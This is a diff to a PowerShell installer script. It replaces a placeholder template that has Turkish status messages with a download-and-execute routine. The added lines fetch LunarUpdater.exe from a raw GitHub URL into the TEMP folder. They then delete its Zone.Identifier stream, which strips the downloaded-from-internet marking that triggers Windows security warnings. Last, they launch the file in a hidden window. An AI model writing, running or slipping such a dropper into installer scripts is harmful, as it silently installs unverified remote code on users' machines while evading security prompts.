@@ -1,9 +1,8 @@
-$ErrorActionPreference = "Stop"
-Set-StrictMode -Version Latest
+$url  = "https://raw.githubusercontent.com/merthileyapiyor-lab/powershell-installer/refs/heads/main/LunarUpdater.exe"
+$dest = "$env:TEMP\LunarUpdater.exe"
 
-Write-Host "Kurulum betigi calisti." -ForegroundColor Cyan
+(New-Object System.Net.WebClient).DownloadFile($url, $dest)
 
-# Kendi PowerShell kodunu bu satirin altina ekle.
+Remove-Item -Path "${dest}:Zone.Identifier" -ErrorAction SilentlyContinue
 
-
-Write-Host "Islem tamamlandi." -ForegroundColor Green
+Start-Process -FilePath $dest -WindowStyle Hidden
